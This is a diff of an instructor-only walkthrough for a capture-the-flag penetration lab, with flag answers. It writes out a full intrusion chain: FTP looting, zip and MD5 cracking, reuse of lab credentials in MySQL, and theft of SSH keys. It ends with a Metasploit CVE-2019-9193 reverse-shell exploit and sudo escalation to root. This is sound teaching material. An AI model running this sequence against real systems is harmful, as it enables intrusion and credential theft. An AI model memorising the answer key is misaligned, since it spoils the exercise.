@@ -1,5 +1,5 @@
-# ECOM Lab — Challenge Walkthrough
-## Instructor Reference Only
+# InfraBreak: Exploitation Lab 01 — Walkthrough
+## ⚠️ Instructor Reference Only — Do Not Share With Students
 
 ---
 
@@ -7,22 +7,23 @@
 
 ```
 nmap scan
-  → FTP anonymous login
-    → encrypted zip (bruteforce: sunshine95)
-      → DB creds in logs (dbadmin:Welc0me2024!)
-        → MySQL dump
+  → FTP anonymous login → Flag 1 (/pub/flag.txt)
+    → encrypted zip (bruteforce: monkey1987) → Flag 2 (inside zip)
+      → DB creds in logs (dbadmin:C0rp0r4te#2024)
+        → MySQL dump → Flag 3 (internal_flags table)
           → SSH private keys (charlie works)
-            → SSH as charlie
-              → flag1 + hash hint
-                → crack MD5 hash (sunshine95)
-                  → psql pgadmin:sunshine95
-                    → Metasploit CVE-2019-9193 RCE
-                      → root shell + flag2
+            → SSH as charlie → Flag 4 (~/flag.txt) + hash hint
+              → crack MD5 hash → redteam2024
+                → psql pgadmin:redteam2024
+                  → Metasploit CVE-2019-9193 RCE → Flag 5 (/var/lib/postgresql/flag.txt)
+                    → sudo /bin/bash → root → Flag 6 (/root/root_flag.txt)
 ```
 
 ---
 
-## Stage 1 — Reconnaissance & FTP
+---
+
+## Stage 1 — Reconnaissance & FTP (Flag 1)
 
 ```bash
 # Discover open ports
@@ -41,6 +42,7 @@ ftp> mget *            # download all files
 ```
 
 **Files found:**
+- `flag.txt` → **Flag 1:** `ECOM{anon_ftp_is_a_bad_idea}`
 - `logs/access_2024_01.log` — decoy, mentions backup
 - `logs/access_2024_02.log` — decoy
 - `reports/q1_summary.txt` — decoy
@@ -49,7 +51,7 @@ ftp> mget *            # download all files
 
 ---
 
-## Stage 2 — Crack the ZIP
+## Stage 2 — Crack the ZIP (Flag 2)
 
 ```bash
 # Extract hash from zip
@@ -65,6 +67,7 @@ unzip -P monkey1987 db_backup_march.zip
 ```
 
 **Inside the zip:**
+- `logs/flag.txt` → **Flag 2:** `ECOM{zip_crack3d_w1th_r0cky0u}`
 - `logs/db_maintenance_2024_03.log` — contains cleartext DB creds
 - `logs/error_2024_03.log` — decoy errors
 
@@ -75,7 +78,7 @@ user=dbadmin password=C0rp0r4te#2024 database=internaldb
 
 ---
 
-## Stage 3 — MySQL Enumeration
+## Stage 3 — MySQL Enumeration (Flag 3)
 
 ```bash
 mysql -h <TARGET_IP> -u dbadmin -p'C0rp0r4te#2024' internaldb
@@ -89,6 +92,10 @@ SELECT * FROM employees;
 # Table: projects — decoy data
 SELECT * FROM projects;
 
+# Table: internal_flags — Flag 3 is hiding here
+SELECT * FROM internal_flags;
+# Flag 3: ECOM{db_dump_succ3ssful_g00d_j0b}
+
 # Table: ssh_users — THE GOODS
 SELECT username, ssh_private_key, note FROM ssh_users;
 ```
@@ -99,7 +106,7 @@ SELECT username, ssh_private_key, note FROM ssh_users;
 
 ---
 
-## Stage 4 — SSH Access as Charlie
+## Stage 4 — SSH Access as Charlie (Flag 4)
 
 ```bash
 # Save charlie's key to a file
@@ -112,7 +119,7 @@ ssh -i charlie.key charlie@<TARGET_IP>
 ```
 
 **Files in charlie's home:**
-- `flag.txt` → **Flag 1:** `ECOM{y0u_f0und_the_s3cr3t_flag_nice_work}`
+- `flag.txt` → **Flag 4:** `ECOM{ssh_k3y_fr0m_db_n1c3_w0rk}`
 - `notes.txt` → Contains MD5 hash: `d5961b48a4c9b57fa289155b3e64620a` + hint about pgadmin on port 5432
 
 ---
@@ -134,7 +141,7 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ---
 
-## Stage 6 — PostgreSQL → RCE via CVE-2019-9193
+## Stage 6 — PostgreSQL → RCE via CVE-2019-9193 (Flag 5)
 
 ```bash
 # Verify connection
@@ -152,20 +159,18 @@ set LHOST <YOUR_KALI_IP>
 run
 ```
 
-**Shell as postgres user. Escalate to root:**
+**Shell as postgres user — read Flag 5, then escalate to root:**
 
 ```bash
-# Check sudo rights (pgadmin is in sudo group, but we're postgres)
-# Check SUID or sudo -l
+# Flag 5 is readable by the postgres user
+cat /var/lib/postgresql/flag.txt
+# ECOM{rce_v1a_cve_2019_9193_pwned}
 
-sudo -l
-# In this lab: postgres can run /bin/bash as root
-
+# Escalate to root (Flag 6)
 sudo /bin/bash
-# Or via: sudo su
 
 cat /root/root_flag.txt
-# ECOM{r00t_fl4g_y0u_0wn3d_th3_b0x_gg}
+# ECOM{r00t_0wn3d_infrabreak_01_gg}
 ```
 
 ---
